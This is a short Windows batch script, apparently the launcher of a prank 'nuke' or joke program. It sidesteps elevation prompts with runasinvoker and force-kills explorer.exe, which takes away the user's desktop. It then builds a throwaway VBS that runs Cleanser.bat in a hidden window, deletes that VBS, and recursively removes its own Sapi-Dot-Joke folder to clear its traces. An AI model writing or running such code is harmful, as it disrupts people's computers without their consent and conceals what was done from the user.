@echo off
break off
cls
set __compat_layer=runasinvoker
goto main

:main
cd Manual Nuke
start Console.bat
timeout 5
start Sound.vbs
timeout 3
cd ..
cd ..
cd ..
cd ..
taskkill /im "explorer.exe" -f
timeout 2
echo Set Shell = WScript.CreateObject("WScript.Shell"^) > startcleanser.vbs
echo on error resume next >> startcleanser.vbs
echo Shell.Run("Cleanser.bat"^), 0, True >> startcleanser.vbs
Start /min startcleanser.vbs
timeout 1
del startcleanser.vbs
timeout 2
RMDIR Sapi-Dot-Joke /s /q
exit

:: Original Creation Date 1/15/2020 11:13 AM ::